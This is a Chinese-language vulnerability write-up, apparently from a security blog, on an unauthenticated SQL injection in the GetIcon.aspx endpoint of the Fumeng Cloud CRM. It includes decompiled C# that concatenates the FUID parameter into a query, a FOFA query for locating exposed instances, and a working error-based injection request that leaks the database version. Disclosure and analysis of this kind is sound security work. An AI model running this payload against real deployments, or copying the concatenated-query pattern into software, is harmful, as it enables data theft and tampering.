---
title: "孚盟云CRM GetIcon.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-geticon-fuid-sqli.html
asset_dir: assets/孚盟云crm-geticon.aspx-sql注入漏洞
---

# 孚盟云CRM GetIcon.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/12 13:20
- 1044浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

计算机安全

数据库

SQL

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetIcon.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetIcon.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetIcon` 方法的实现如下

```
public class GetIcon : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    string str1 = this.Request.QueryString["FUID"];
    if (str1 == null || !string.op_Inequality(str1, ""))
      return;
    DataTable table = this.dbHelper.Query($"select * from dcFile where FUID='{str1}'").Tables[0];
    string str2 = table.Rows[0]["FileType"].ToString();
```

深入探索

物流软件安全

恶意软件分析工具

安全运维咨询

未经过滤或参数化绑定的参数 `FUID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetIcon.aspx SQL注入漏洞](images/img-001-c8124439ad51.webp)](https://image.mrxn.net/f0dfeacb593f467bad6cefc77fa39fc5.webp)

通过报错注入，成功在响应里回显出数据库版本信息。

SQL注入防护

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
